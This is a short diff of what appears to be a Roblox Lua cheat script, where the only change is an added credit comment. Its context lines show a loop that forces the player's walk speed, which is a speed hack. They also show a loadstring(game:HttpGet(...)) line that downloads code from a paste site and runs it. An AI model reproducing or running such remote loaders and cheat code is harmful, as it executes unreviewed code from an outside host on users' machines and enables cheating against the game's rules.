@@ -302,3 +302,5 @@ game:GetService("RunService").Heartbeat:Connect(function()
 	game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = sp
 end)
 loadstring(game:HttpGet(('https://pastefy.app/M0N30XXG/raw'),true))()
+
+--Script by no name,modifed by krutoy capybarin
